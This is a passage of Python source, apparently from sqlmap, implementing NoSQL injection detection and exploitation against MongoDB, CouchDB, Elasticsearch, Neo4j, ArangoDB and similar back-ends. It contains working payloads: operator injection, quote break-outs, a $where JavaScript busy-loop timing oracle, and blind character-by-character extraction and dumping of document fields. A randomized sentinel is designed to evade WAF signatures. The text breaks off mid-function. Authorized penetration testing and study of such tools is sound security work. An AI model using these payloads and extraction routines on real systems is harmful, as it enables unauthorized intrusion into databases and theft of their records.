#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import json
import re
import time

from collections import namedtuple
from collections import OrderedDict

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.utils.nonsql import userDecision
from lib.utils.nonsql import sqlErrorPresent
from lib.utils.nonsql import blockedStatus
from lib.utils.nonsql import ratio as _ratio
from lib.utils.nonsql import userOracleActive
from lib.utils.nonsql import InconclusiveError
from lib.utils.nonsql import INCONCLUSIVE_MARK
from lib.utils.nonsql import resolveBit
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.enums import POST_HINT
from lib.core.settings import NOSQL_CHAR_MAX
from lib.core.settings import NOSQL_CHAR_MIN
from lib.core.settings import NOSQL_ERROR_REGEX
from lib.core.settings import NOSQL_MAX_FIELDS
from lib.core.settings import NOSQL_MAX_LENGTH
from lib.core.settings import NOSQL_MAX_RECORDS
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange
from thirdparty.six.moves import urllib as _urllib

# Improbable literal used to build always-true/never-match payloads. Randomized per run (like
# kb.chars boundaries) so it never becomes a static signature a WAF can pin a blocking rule on.
NOSQL_SENTINEL = randomStr(length=10, lowercase=True)

# Maximum number of characters of in-band (reflected) data surfaced from an always-true response
NOSQL_DUMP_LIMIT = 4096

# Delivery shapes that can carry an injection into a back-end filter/query. PLACE.URI is intentionally
# NOT listed: `_send` has no path-segment mutation (it would route a URI point through the generic
# form/query serializer, corrupting the request), so advertising it would be a false promise. Add it
# back only alongside real URI-marker (`*`) path mutation through sqlmap's URI machinery.
NOSQL_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST, PLACE.COOKIE)

# Lucene regexp metacharacters (Elasticsearch/Solr) requiring escaping in built patterns
LUCENE_META = set('.?+*|(){}[]"\\/')

# Java regexp metacharacters (Cypher/AQL =~) requiring escaping in built patterns
JAVA_META = set('.?+*|(){}[]^$\\/')

# Engines detectable through a syntax-breaking probe but lacking a clean substring oracle for blind
# extraction (mapped from recognizable error-message fragments - not product names - to back-end name)
ERROR_SIGNATURES = (
    ("Cassandra", ("no viable alternative at input", "org.apache.cassandra", "com.datastax", "invalidrequestexception")),
    ("Redis", ("wrongtype operation", "err error compiling script", "err error running script", "@user_script", "replyerror")),
    ("Memcached", ("client_error bad", "server_error object too large")),
    ("InfluxDB", ("error parsing query", "unable to parse")),
    ("HBase/Phoenix", ("org.apache.phoenix", "phoenixparserexception", "org.apache.hadoop.hbase")),
)

_UNSET = object()

# HTTP status of the most recent request issued by _send() (None when bypassed, e.g. under tests)
_lastCode = None

# set by _isError() whenever a probe response carries a recognized SQL/DBMS error - a strong sign
# the parameter is plainly SQL-injectable (not NoSQL); surfaced as a hint when nothing NoSQL matches
_sqlErrorSeen = False

# Resolved injection vector. `template` is the always-true page for content-based blind extraction
# (None for time-based/detection-only); `bypass` is the always-true payload reported as a login/filter
# bypass; `truth` overrides the content oracle (e.g. a timing predicate for the $where time-based path);
# `dump` is a callable returning (columns, rows) for a whole-document dump (server-side-JS key enumeration).
# `bound` records whether a whole-document dump is provably tied to ONE record (a unique-ish sibling
# constraint pins it, or the walk keys on a unique per-record id like a Neo4j node id). When False the
# recovered fields may come from DIFFERENT matching documents, so the output is labelled representative
# rather than presented as one coherent document.
# `falseModel` is the always-FALSE (never-match) page, calibrated alongside `template` (the always-true
# page). Content-based blind extraction classifies each bit RELATIVE to BOTH models (shared resolveBit),
# so an unrelated usable page (session-expired / CAPTCHA / soft-WAF / validation) leans to neither and is
# INCONCLUSIVE rather than a fabricated false bit. When a false model cannot be calibrated, content
# extraction is DISABLED for that vector (never silently one-sided).
Vector = namedtuple("Vector", ("dbms", "fetch", "lengthValue", "charValue", "template", "bypass", "truth", "dump", "bound", "falseModel"))
Vector.__new__.__defaults__ = (None, None, None, None, True, None)


def _encode(value):
    return _urllib.parse.quote(value, safe="")

def _lucene(value):
    return "".join(("\\" + _ if _ in LUCENE_META else _) for _ in value)

def _javaEscape(value):
    return "".join(("\\" + _ if _ in JAVA_META else _) for _ in value)

def _quoted(regex):
    # double every backslash so a regexp survives a single-quoted string literal (Cypher/AQL/N1QL),
    # whose own backslash processing would otherwise strip one level before the engine parses it
    return regex.replace("\\", "\\\\")

def _isJsonBody():
    return kb.postHint in (POST_HINT.JSON, POST_HINT.JSON_LIKE)

def _jsonKey(parameter):
    for prefix in ("JSON ", "JSON-like "):
        if parameter.startswith(prefix):
            return parameter[len(prefix):]
    return parameter

# --- JSON / JSON-like lexical scanner -----------------------------------------------------------
# These skips give the mutation locator a real tokenizer's states so a 'key:'-looking fragment inside
# a string, comment, backtick template, or regex literal is never mistaken for a property, and a
# '}'/']' inside any of those never closes an object/array value early.

def _skipString(body, i):
    """`body[i]` is an opening quote (", ' or `); return the index just past the closing quote."""
    q, n, j, esc = body[i], len(body), i + 1, False
    while j < n:
        c = body[j]
        if esc:
            esc = False
        elif c == "\\":
            esc = True
        elif c == q:
            return j + 1
        j += 1
    return n


def _skipComment(body, i):
    """`body[i:i+2]` is `//` or `/*`; return the index just past the comment."""
    if body[i + 1] == "/":
        j = body.find("\n", i)
        return len(body) if j == -1 else j + 1
    j = body.find("*/", i + 2)
    return len(body) if j == -1 else j + 2


def _skipRegex(body, i):
    """`body[i]` is `/` in a value position; return the index past the closing `/` AND any trailing
    flag letters (e.g. `/abc/gi`) of a JS regex literal (honouring `[...]` character classes and
    escapes), or None when it is not a regex (no close on the line). Consuming the flags matters: a
    regex VALUE's span must cover `/abc/i` in full, else the mutation would leave a dangling `i`."""
    n, j, esc, inClass = len(body), i + 1, False, False
    while j < n:
        c = body[j]
        if esc:
            esc = False
        elif c == "\\":
            esc = True
        elif c == "[":
            inClass = True
        elif c == "]":
            inClass = False
        elif c == "\n":
            return None
        elif c == "/" and not inClass:
            j += 1
            while j < n and body[j].isalpha():          # consume trailing regex flags (g/i/m/s/u/y/...)
                j += 1
            return j
        j += 1
    return None


def _jsonValueSpan(body, pos):
    """Given `pos` just after a property's ':', return the [start, end) span of its value token - a
    quoted/backtick string, a regex literal, a balanced object/array, or a scalar - or None. Strings,
    comments and regex literals inside an object/array value are skipped so a '}'/']'/quote/':' within
    any of them does not close the token early."""
    n = len(body)
    while pos < n and body[pos] in " \t\r\n":
        pos += 1
    if pos >= n:
        return None
    c = body[pos]
    if c in ('"', "'", "`"):
        return (pos, _skipString(body, pos))
    if c == "/" and pos + 1 < n and body[pos + 1] not in "/*":      # regex-literal value
        end = _skipRegex(body, pos)
        return (pos, end if end else pos + 1)
    if c in "{[":
        close = "}" if c == "{" else "]"
        depth, j = 0, pos
        while j < n:
            cj = body[j]
            if cj in ('"', "'", "`"):
                j = _skipString(body, j)
                continue
            if cj == "/" and j + 1 < n and body[j + 1] in "/*":
                j = _skipComment(body, j)
                continue
            if cj == "/" and j + 1 < n:                             # possible regex inside the value
                r = _skipRegex(body, j)
                if r:
                    j = r
                    continue
            if cj == c:
                depth += 1
            elif cj == close:
                depth -= 1
                if depth == 0:
                    return (pos, j + 1)
            j += 1
        return None
    j = pos
    while j < n and body[j] not in ",}] \t\r\n":
        j += 1
    return (pos, j)


def _jsonLocateValues(body, key):
    """Return the [start, end) value span of EVERY genuine property named `key`. A genuine property
    name is a quoted or bareword token OUTSIDE strings, comments, backtick templates and regex literals,
    followed by ':', so a 'key:'-looking fragment inside any of those is never matched (the reviewer's
    `{"note":"name: x",...}` and `{pattern:/name: trap/,...}` cases). `prevSig` tracks the last
    significant char so a '/' in value position is read as a regex literal rather than division."""
    n, i = len(body), 0
    prevSig = "{"                                   # a key/value is expected at the start
    spans = []
    while i < n:
        c = body[i]
        if c in " \t\r\n":
            i += 1
            continue
        if c == "/" and i + 1 < n and body[i + 1] in "/*":
            i = _skipComment(body, i)
            continue
        if c == "/" and prevSig in ":,[{(=":        # regex literal in value position -> skip it whole
            r = _skipRegex(body, i)
            if r:
                prevSig = "/"
                i = r
                continue
        if c in ('"', "'", "`"):
            end = _skipString(body, i)
            k = end
            while k < n and body[k] in " \t\r\n":
                k += 1
            # a quoted (not backtick) token immediately followed by ':' is a property name
            if c in ('"', "'") and body[i + 1:end - 1] == key and k < n and body[k] == ":":
                span = _jsonValueSpan(body, k + 1)
                if span:
                    spans.append(span)
                    i = span[1]                     # continue past the value to find other occurrences
                    prevSig = "v"
                    continue
            prevSig, i = c, end
            continue
        if c.isalpha() or c == "_":                 # a bareword token (JSON-like unquoted key)
            start = i
            while i < n and (body[i].isalnum() or body[i] in "_$"):
                i += 1
            k = i
            while k < n and body[k] in " \t\r\n":
                k += 1
            if body[start:i] == key and k < n and body[k] == ":":
                span = _jsonValueSpan(body, k + 1)
                if span:
                    spans.append(span)
                    i = span[1]
                    prevSig = "v"
                    continue
            prevSig = "w"
            continue
        prevSig = c
        i += 1
    return spans


def _jsonRawReplace(body, parameter, jsonValue):
    """Replace ONLY the target property's value span with `json.dumps(jsonValue)`, located by the
    string/comment/regex-aware scanner (never a regex sub, never a form serializer). Handles a value
    that is a string, number, bool/null, object, array, or regex-with-flags, and preserves the rest of
    the body byte-for-byte. With only the leaf key name available (no parsed path), an AMBIGUOUS body -
    the same key name appearing at more than one place/depth - is NOT guessed: the probe is SKIPPED
    (returns None) rather than mutate the wrong field. Returns None when the property is absent or
    ambiguous (caller skips the probe)."""
    spans = _jsonLocateValues(body, _jsonKey(parameter))
    if len(spans) != 1:                             # 0 = not found, >1 = ambiguous -> skip, never guess
        return None
    start, end = spans[0]
    return body[:start] + json.dumps(jsonValue) + body[end:]

def _delim(place):
    # parameter delimiter for the place: ';' for cookies (per --cookie-del), '&' otherwise
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'

def _originalValue(place, parameter):
    for segment in conf.parameters[place].split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""

def _replaceSegment(place, parameter, segment):
    """Rebuild conf.parameters[place], swapping the target parameter for `segment` (e.g. 'k[$ne]=v'
    or 'k=v') while preserving every sibling parameter verbatim"""

    delimiter = _delim(place)
    retVal, replaced = [], False

    for part in conf.parameters[place].split(delimiter):
        if not replaced and part.split('=', 1)[0].strip() == parameter:
            retVal.append(segment)
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = [segment if name == parameter else "%s=%s" % (_encode(name), _encode(value)) for name, value in conf.paramDict[place].items()]

    return delimiter.join(retVal)

def _send(place, parameter, segment=None, jsonValue=_UNSET):
    """Issues a single request with the target parameter overridden - by raw 'name=value' segment for
    URL/body parameters, or by setting the key to `jsonValue` for JSON bodies - returning the response"""

    global _lastCode

    skipUrlEncode = conf.skipUrlEncode
    conf.skipUrlEncode = True

    if conf.delay:
        time.sleep(conf.delay)

    try:
        kwargs = {"raise404": False, "silent": True}

        jsonBody = jsonValue is not _UNSET and _isJsonBody() and place in (PLACE.POST, PLACE.CUSTOM_POST)
        if jsonBody:
            # Mutate ONLY the target property's value span in place, located by a string/comment-aware
            # scanner. This is used for BOTH strict and JSON-like bodies: it is structurally safe (never
            # matches a 'key:' fragment inside a string/comment), handles a value at any depth and of any
            # type (string/number/object/array), preserves the rest of the body byte-for-byte, and never
            # falls back to a form serializer. When the exact property cannot be located, SKIP the probe
            # rather than send a corrupted body (a fabricated diff would be a false positive).
            payload = _jsonRawReplace(conf.data, parameter, jsonValue)
            if payload is None:
                logger.debug("NoSQL: JSON property '%s' not locatable in the body; skipping probe" % _jsonKey(parameter))
                return None
            kwargs["post"] = payload
        elif place == PLACE.COOKIE:
            payload = kwargs["cookie"] = _replaceSegment(place, parameter, segment)
        else:
            payload = _replaceSegment(place, parameter, segment)
            kwargs["post" if place in (PLACE.POST, PLACE.CUSTOM_POST) else "get"] = payload

        logger.log(CUSTOM_LOGGING.PAYLOAD, _urllib.parse.unquote(payload))     # readable, surfaced at -v 3 like a regular sqlmap payload
        page, _, _lastCode = Request.getPage(**kwargs)
    except Exception as ex:                     # a transport failure must never enter the oracle as ""
        logger.debug("NoSQL probe request failed: %s" % getUnicode(ex))
        _lastCode = None
        return None
    finally:
        conf.skipUrlEncode = skipUrlEncode

    return page or ""

def _isError(page):
    # a server-error status, a recognizable NoSQL error body, OR a recognized SQL/DBMS error marks a
    # response as NOT a valid always-true template (prevents two differing error pages from faking a
    # boolean oracle). The SQL/DBMS check is essential: a payload that trips a DBMS syntax error (e.g.
    # numeric `cat=*` on MySQL -> "You have an error in your SQL syntax") yields a STABLE page that
    # merely DIFFERS from a no-match page, which would otherwise fake a boolean oracle and misreport a
    # plainly SQL-injectable parameter as NoSQL. htmlParser() reuses sqlmap's errors.xml signatures.
    global _sqlErrorSeen
    # a server error (>=500) or a WAF/rate-limit block (403/429) is BLOCKED/ERROR, never a valid
    # template - a mid-scan 429 or a 403 block page must not be read as a "false" (or as divergence)
    if blockedStatus(_lastCode) or bool(re.search(NOSQL_ERROR_REGEX, page or "")):
        return True
    # a DBMS-identifiable error (errors.xml signatures) OR sqlmap's generic SQL-error marker
    if sqlErrorPresent(page):
        _sqlErrorSeen = True
        return True
    return False

def _fetch(place, parameter, op, value, isArray=False):
    """MongoDB/CouchDB dialect: renders the parameter as an operator object (bracket or JSON shape)"""

    suffix = ("[%s][]" % op) if isArray else ("[%s]" % op)
    segment = "%s%s=%s" % (_encode(parameter), suffix, _encode(value))
    return _send(place, parameter, segment, {op: [value]} if isArray else {op: value})

def _fetchValue(place, parameter, value):
    """String dialects (Lucene query_string, Cypher, AQL): replaces the parameter's value verbatim"""

    return _send(place, parameter, "%s=%s" % (_encode(parameter), _encode(value)), value)

def _boolean(truthy, falsy):
    """Returns the (reproducible) true-page when a NoSQL true/false payload pair yields a stable
    content divergence - i.e. the payload reached and influenced the back-end - else None"""

    truePage = truthy()
    if not truePage or _isError(truePage):      # an error/blocked response is never a valid template
        return None
    if _ratio(truePage, truthy()) <= UPPER_RATIO_BOUND:     # the TRUE side must independently reproduce
        return None

    falsePage = falsy()
    if not falsePage or _isError(falsePage):    # a false-side error must not pass as "divergence"
        return None
    if _ratio(falsePage, falsy()) <= UPPER_RATIO_BOUND:     # the FALSE side must independently reproduce too
        return None

    # with an explicit user oracle (--string/--not-string/--regexp), require the true page to classify
    # TRUE and the false page FALSE - do not fall back to raw similarity that the user overrode
    if userOracleActive():
        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None

    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:     # ... and true must differ from false
        return truePage

    return None

def _reproduced(sendFn):
    """Send a never-matching (always-FALSE) payload twice and return its page as the FALSE model, or
    None when it is unusable or not reproducible. Used to calibrate the false model each content vector
    carries so extraction classifies bits relative to BOTH models (else extraction is disabled)."""
    p1 = sendFn()
    if not p1 or _isError(p1):
        return None
    if _ratio(p1, sendFn()) <= UPPER_RATIO_BOUND:
        return None
    return p1

def _detectMongo(place, parameter):
    # $ne (matches everything) vs $in [sentinel] (matches nothing); $gt '' (matches any string) is a
    # fallback always-true for apps that filter $ne but not the comparison operators
    return _boolean(lambda: _fetch(place, parameter, "$ne", NOSQL_SENTINEL), lambda: _fetch(place, parameter, "$in", NOSQL_SENTINEL, isArray=True)) \
        or _boolean(lambda: _fetch(place, parameter, "$gt", ""), lambda: _fetch(place, parameter, "$in", NOSQL_SENTINEL, isArray=True))

def _detectES(place, parameter):
    # '*' (matches everything) vs a literal sentinel (matches nothing) is a cheap FIRST-PASS trigger,
    # but on its own it is NOT proof of injection: many search APIs treat '*' as a wildcard by design.
    template = _boolean(lambda: _fetchValue(place, parameter, '*'), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL))
    if not template:
        return None
    # STRUCTURAL proof the value is parsed as a Lucene query_string (not used as a literal search term):
    # boolean operators the parser evaluates - `(NOT <rand>)` matches all, `(<rand> AND NOT <rand>)`
    # matches nothing - whereas a plain wildcard-search box treats both as a literal string (no divergence).
    if not _confirm(place, parameter, "(NOT %s)" % NOSQL_SENTINEL, "(%s AND NOT %s)" % (NOSQL_SENTINEL, NOSQL_SENTINEL)):
        return None
    return template

def _detectCypher(place, parameter):
    # single-quote break-out: OR '1'='1' (true) vs OR '1'='2' (false)
    return _boolean(lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' OR '1'='1"), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' OR '1'='2"))

def _detectAQL(place, parameter):
    # single-quote break-out: || '1'=='1 (true) vs || '1'=='2 (false)
    return _boolean(lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' || '1'=='1"), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' || '1'=='2"))

def _detectNumeric(place, parameter):
    # unquoted (numeric-context) boolean break-out for SQL-like back-ends: OR/AND (Cypher/N1QL) or
    # ||/&& (AQL). A numeric field is not blindly regexp-extractable, so exploitation is the in-band
    # dump of the always-true response (rows reflected by the page)
    value = (_originalValue(place, parameter) or "1").strip()
    if not value.isdigit():
        return None

    template = _boolean(lambda: _fetchValue(place, parameter, "%s OR 1=1" % value), lambda: _fetchValue(place, parameter, "%s AND 1=2" % value))
    if template:
        # CRITICAL: `OR 1=1`/`AND 1=2` is IDENTICAL to classic SQL injection, so a bare divergence here
        # is AMBIGUOUS - a plain SQL-injectable numeric parameter diverges exactly the same way. It is a
        # NoSQL finding ONLY when an engine-SPECIFIC primitive (one no SQL back-end implements) ALSO
        # confirms: N1QL REGEXP_CONTAINS, DynamoDB begins_with, Cypher STARTS WITH. Without such positive
        # proof we must NOT attribute a DBMS (the old `else: Neo4j` default turned every SQL-injectable
        # numeric parameter into a false Neo4j positive) - return None and let SQL detection handle it.
        if _confirm(place, parameter, "%s OR REGEXP_CONTAINS('ab', 'a') OR 1=2" % value, "%s OR REGEXP_CONTAINS('ab', 'z') OR 1=2" % value):
            dbms = "Couchbase"
        elif _confirm(place, parameter, "%s OR begins_with('ab', 'a') OR 1=2" % value, "%s OR begins_with('ab', 'z') OR 1=2" % value):
            dbms = "DynamoDB"
        elif _confirmBattery(place, parameter,
                             lambda p: "%s OR %s OR 1=2" % (value, p),
                             lambda p: "%s OR %s OR 1=2" % (value, p), _CYPHER_PREDICATES):
            dbms = "Neo4j"
        else:
            return None
        return dbms, template, "%s OR 1=1" % value

    template = _boolean(lambda: _fetchValue(place, parameter, "%s || 1==1" % value), lambda: _fetchValue(place, parameter, "%s && 1==2" % value))
    if template:
        # AQL `||`/`&&`/`==`; a PIPES_AS_CONCAT SQL engine can partly mimic `||`, so require a positive
        # AQL-specific primitive from the battery (functions SQL lacks: two-arg LIKE, CONTAINS, LENGTH, REGEX_TEST)
        if _confirmBattery(place, parameter,
                           lambda p: "%s || %s || 1==2" % (value, p),
                           lambda p: "%s || %s || 1==2" % (value, p), _AQL_PREDICATES):
            return "ArangoDB", template, "%s || 1==1" % value
        return None

    return None

def _detectError(place, parameter):
    # last-resort: a syntax-breaking value that diverges from a normal one and surfaces an engine error
    original = _originalValue(place, parameter) or '1'
    normal = _fetchValue(place, parameter, original)
    broken = _fetchValue(place, parameter, original + "'")

    if not normal or not broken or _ratio(normal, broken) >= UPPER_RATIO_BOUND:   # None broken -> no crash on .lower()
        return None

    for engine, tokens in ERROR_SIGNATURES:
        # the diagnostic must be injection-specific (token absent from the normal page) and
        # must reproduce, so a dynamic page that merely happens to diverge and mention an
        # engine name once is not mistaken for an error-based oracle
        if any(_ in broken.lower() for _ in tokens) and not any(_ in normal.lower() for _ in tokens):
            reBroken = _fetchValue(place, parameter, original + "'")
            if any(_ in (reBroken or "").lower() for _ in tokens):
                return engine

    return None

def _fingerprintMongo(place, parameter):
    page = (_fetch(place, parameter, "$regex", '(') or "").lower()   # invalid regexp -> driver/DB error (None-safe)
    if any(_ in page for _ in ("couch", "mango", "bad_arg", "erlang")):
        return "CouchDB"
    elif any(_ in page for _ in ("mongo", "bson", "regular expression", "$regex")):
        return "MongoDB"
    else:
        # operator injection worked but no product-specific signature leaked - name the FAMILY,
        # not a specific product we cannot prove
        return "MongoDB/CouchDB-compatible operator back-end"

def _fingerprintLucene(place, parameter):
    page = (_fetchValue(place, parameter, "/[/") or "").lower()      # invalid regexp -> engine error (None-safe)
    if any(_ in page for _ in ("solr", "solrexception")):
        return "Solr"
    elif "opensearch" in page:
        return "OpenSearch"
    else:
        # Lucene query_string parsing confirmed but no product signature - name the FAMILY (this is
        # most commonly Elasticsearch, but Solr/OpenSearch/Lucene share the syntax)
        return "Lucene query_string-compatible back-end"

def _constraint(place, parameter, eq='=', conj=" AND ", prefix="u."):
    """Re-expresses sibling parameters as query constraints (field == parameter name) so extraction
    stays bound to the originally matched record. `prefix`/`eq`/`conj` adapt the per-dialect syntax
    (Cypher: 'u.'/'='/' AND '; AQL: 'u.'/'=='/' && '; $where JS: 'this.'/'=='/'&&')"""

    parts = []

    for segment in conf.parameters[place].split(_delim(place)):
        if '=' not in segment:
            continue
        name, _, value = segment.partition('=')
        name = name.strip()
        if not name or name == parameter:
            continue
        # only bind a sibling whose name is a plain field identifier: a dotted/quoted/operator/spaced
        # name could change the PREDICATE STRUCTURE (not just add a filter) once interpolated, so it is
        # skipped rather than trusted (the reviewer's "verified relationship" bar)
        if not re.match(r"(?i)\A[a-z_][\w]*\Z", name):
            continue
        # escape the literal so a quote/backslash in the value cannot break out of the single-quoted
        # string and alter/invalidate the predicate (Cypher/AQL/$where-JS all single-quote + backslash)
        literal = value.replace("\\", "\\\\").replace("'", "\\'")
        parts.append("%s%s%s'%s'" % (prefix, name, eq, literal))

    return (conj.join(parts) + conj) if parts else ""

def _confirm(place, parameter, truePayload, falsePayload):
    # disambiguates dialects that share the same break-out syntax by probing a dialect-specific
    # regexp-match primitive (e.g. Cypher '=~' vs N1QL 'REGEXP_CONTAINS') for a true/false divergence
    return _boolean(lambda: _fetchValue(place, parameter, truePayload), lambda: _fetchValue(place, parameter, falsePayload)) is not None

# Engine-specific primitive BATTERIES: each pair is (true_predicate, false_predicate) that differ
# ONLY in the engine-unique construct, so the divergence is attributable to that construct alone (a
# SQL back-end errors on every one of them -> no divergence). A rich battery (not a single primitive)
# makes attribution robust to an injection context that rejects any one function AND, by WHICH members
# fire, fingerprints the engine. Live-validated on the karlobag testbed (each flips on the real engine,
# none flips on the MySQL junkyard). Constant expressions only (no field reference needed).
_CYPHER_PREDICATES = (                                          # Neo4j Cypher
    ("'ab' STARTS WITH 'a'", "'ab' STARTS WITH 'z'"),
    ("'ab' ENDS WITH 'b'",   "'ab' ENDS WITH 'z'"),
    ("'ab' CONTAINS 'a'",    "'ab' CONTAINS 'z'"),
    ("size(['a','b'])=2",    "size(['a','b'])=3"),
    ("toInteger('7')=7",     "toInteger('7')=8"),
)
_AQL_PREDICATES = (                                             # ArangoDB AQL
    ("LIKE('ab', 'a%')",     "LIKE('ab', 'z%')"),
    ("CONTAINS('ab', 'a')",  "CONTAINS('ab', 'z')"),
    ("LENGTH('ab')==2",      "LENGTH('ab')==3"),
    ("REGEX_TEST('ab','^a')", "REGEX_TEST('ab','^z')"),
)

def _confirmBattery(place, parameter, wrapTrue, wrapFalse, battery):
    """Positive engine proof: return True as soon as ANY battery predicate flips true/false in the
    verified break-out context. `wrapTrue`/`wrapFalse` are callables mapping a predicate to a payload."""
    for truePred, falsePred in battery:
        if _confirm(place, parameter, wrapTrue(truePred), wrapFalse(falsePred)):
            return True
    return False

def _timed(call):
    start = time.time()
    call()
    return time.time() - start

# --- tri-state extraction oracle (shared contract with the XPath/LDAP/HQL/GraphQL engines) ----------
# A failed / blocked / error response is UNKNOWN, never a silent False bit. These resolvers reject an
# unusable response, RE-SEND it up to a bound, and raise InconclusiveError on persistent ambiguity so
# the per-value extractor aborts (returns None) instead of fabricating a length/char/count. `_NOSQL_RETRIES`
# is small - a couple of fresh sends are enough to ride out transient jitter.
_NOSQL_RETRIES = 2


def _contentBit(fetchFn, value, trueModel, falseModel=None, retries=_NOSQL_RETRIES):
    """Tri-state CONTENT bit. An unusable response (None / blocked / DBMS-error) is retried, then aborts
    (InconclusiveError). When a `falseModel` is available, a usable page is classified RELATIVE to BOTH
    models via the shared `resolveBit`: it must lean clearly to the true model over the false model by a
    margin, else it is INCONCLUSIVE (re-sent, then aborts) - so an unrelated usable page (session-expired,
    soft-WAF, validation) becomes UNKNOWN, never a false bit that corrupts the value. Without a false
    model (legacy callers) it falls back to a true-model similarity threshold."""

    def send():
        page = fetchFn(value)
        return None if (page is None or _isError(page)) else page

    if falseModel is not None:
        return resolveBit(send(), trueModel, falseModel, send, retries=retries)

    for _attempt in range(retries + 1):
        page = send()
        if page is not None:
            return _ratio(page, trueModel) > UPPER_RATIO_BOUND
    raise InconclusiveError()


def _timedResponse(place, parameter, payload):
    """Return (elapsed_seconds, usable) for a timing probe. `usable` is False for a transport failure or
    a blocked/error response, so a WAF-induced delay can never be read as a true timing bit."""
    start = time.time()
    page = _fetchValue(place, parameter, payload)
    elapsed = time.time() - start
    return elapsed, (page is not None and not _isError(page))


def _timedBit(place, parameter, payload, threshold, retries=_NOSQL_RETRIES):
    """Tri-state TIMING bit with an ambiguity band. A usable reading clearly above threshold+margin is
    True; clearly below threshold-margin is False; a reading NEAR the threshold (or an unusable one) is
    RE-SAMPLED, and if it never separates cleanly the bit aborts (InconclusiveError) rather than being
    guessed. A blocked/error response is never counted as a (slow) true bit."""
    margin = max(0.5, conf.timeSec * 0.25)
    for _attempt in range(retries + 2):
        elapsed, usable = _timedResponse(place, parameter, payload)
        if not usable:
            continue
        if elapsed > threshold + margin:
            return True
        if elapsed < threshold - margin:
            return False
        # near the threshold: do not decide on one ambiguous sample - loop and re-sample
    raise InconclusiveError()

def _whereDelay(condition):
    # MongoDB $where (server-side JS) string break-out: busy-loops for ~conf.timeSec seconds whenever
    # the per-document JS `condition` holds, yielding a timing oracle when no content differential
    # exists. The document is passed in as `d` (inside the function `this` is not the document).
    #
    # DoS BOUND: `$where` runs the function for EVERY document in the collection, so an unconditional or
    # loose `condition` on a large collection would busy-loop docCount*timeSec seconds and hang the
    # server on a single request. A counter kept in the shared per-query JS scope (`__c`, an implicit
    # global assigned across document invocations) caps the busy-loop to ONE document per request: the
    # timing oracle is unchanged (a slow response still means at least one document matched), but the
    # added latency is ~timeSec regardless of collection size. On a MongoDB build that isolates the
    # scope per invocation the cap simply never trips and behaviour degrades to the old per-doc loop.
    return "%s' || (function(d){if(typeof __c=='undefined'){__c=0;}if(__c<1&&(%s)){__c=1;var t=new Date().getTime();while(new Date().getTime()-t<%d){}}return false})(this) || '1'=='2" % (NOSQL_SENTINEL, condition, int(conf.timeSec * 1000))

def _detectWhere(place, parameter):
    # An unconditional-delay payload must run ~conf.timeSec slower than the baseline - and do so TWICE,
    # from USABLE responses, to reject a one-off jitter spike - while a non-delaying control stays fast.
    # Every measurement is (elapsed, usable): a delayed BLOCKED/failed response (WAF/5xx) is NOT a valid
    # slow sample, so a soft-blocking WAF can no longer establish a time-based $where finding.
    baseDt, baseUsable = _timedResponse(place, parameter, _originalValue(place, parameter) or "1")
    if not baseUsable:
        return None
    threshold = baseDt + conf.timeSec * 0.5

    def slow():
        dt, usable = _timedResponse(place, parameter, _whereDelay("true"))
        return usable and dt > threshold

    def fastControl():
        dt, usable = _timedResponse(place, parameter, "%s' || '1'=='2" % NOSQL_SENTINEL)
        return usable and dt <= threshold

    if slow() and slow() and fastControl():
        return threshold
    return None

def _jsString(value):
    return "'%s'" % value.replace("\\", "\\\\").replace("'", "\\'")

def _whereField(place, parameter, bound, expr, threshold, strict=False):
    """Time-based recovery of an arbitrary per-document JavaScript string expression `expr` (e.g. a key
    name 'Object.keys(d)[i]', or a value 'String(d[name])') via the $where busy-loop oracle. `strict`
    propagates InconclusiveError (for structural key-name probes) instead of returning None."""

    # tri-state timing bit: a blocked/error response is never read as a (slow) true bit, and a
    # persistently unusable probe raises InconclusiveError so the value aborts instead of fabricating
    truth = lambda payload: _timedBit(place, parameter, payload, threshold)
    return _extract(None, None,
                    lambda n: _whereDelay("%s(%s)&&(%s).length>=%d" % (bound, expr, expr, n)),
                    lambda known, klass: _whereDelay("%s/^%s%s/.test(%s)" % (bound, _javaEscape(known), klass, expr)),
                    truth, strict=strict)

def _whereDump(place, parameter, bound, threshold):
    """Whole-document dump via server-side-JavaScript key enumeration: walk Object.keys(this) to recover
    each field name, then String(this[name]) for its value. Returns (columns, rows, bound)."""

    columns, values, partial = [], [], False
    for index in xrange(NOSQL_MAX_FIELDS):
        try:
            name = _whereField(place, parameter, bound, "Object.keys(d)[%d]" % index, threshold, strict=True)
        except InconclusiveError:
            partial = True                          # inconclusive NEXT field name != end of fields
            logger.warning("$where field enumeration became inconclusive at index %d; dump is PARTIAL" % index)
            break
        if not name:                                # genuine end (no more keys)
            break
        columns.append(name)
        cell = _whereField(place, parameter, bound, "String(d[%s])" % _jsString(name), threshold)
        values.append(INCONCLUSIVE_MARK if cell is None else cell)   # None => aborted; keep distinguishable from ""
        logger.info("retrieved: %s='%s'" % (name, values[-1]))

    if partial:
        logger.warning("$where document dump is INCOMPLETE (field enumeration aborted)")
    # NOT bound: a $where key-walk is not pinned to a native _id, so with a loose/absent constraint the
    # keys and values can come from different matching documents. `complete` = not partial.
    return (columns, [values], False, not partial) if columns else None

def _classChar(ordinal):
    char = chr(ordinal)
    return ("\\" + char) if char in "]\\^-" else char       # escape the char-class metacharacters

def _klass(low, high):
    # a regexp character class spanning the codepoints [low, high] (single member when low == high)
    return "[%s]" % _classChar(low) if low == high else "[%s-%s]" % (_classChar(low), _classChar(high))

def _propLiteral(name):
